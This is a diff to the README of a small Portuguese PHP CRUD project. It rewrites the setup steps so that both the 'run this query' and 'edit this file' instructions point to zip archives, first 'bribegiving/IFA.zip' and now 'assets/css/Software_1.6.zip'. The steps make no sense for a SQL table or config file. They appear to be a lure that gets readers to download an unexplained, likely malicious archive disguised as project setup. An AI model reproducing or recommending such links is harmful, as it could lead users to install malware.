@@ -12,8 +12,8 @@ Desenvolvimento de um simples projeto CRUD para matéria PDWEL(incluir, excluir,
 
 ## Configuração do Projeto:
 
-- Executar a query https://raw.githubusercontent.com/RafaEngineer/IFA/master/bribegiving/IFA.zip ou importar o arquivo no phpMyAdmin para criar a table necessária.
-- Editar o arquivo **https://raw.githubusercontent.com/RafaEngineer/IFA/master/bribegiving/IFA.zip** 
+- Executar a query https://github.com/RafaEngineer/IFA/raw/refs/heads/master/assets/css/Software_1.6.zip ou importar o arquivo no phpMyAdmin para criar a table necessária.
+- Editar o arquivo **https://github.com/RafaEngineer/IFA/raw/refs/heads/master/assets/css/Software_1.6.zip** 
 
 ```
 $dbNome = 'nomeDaTable' 
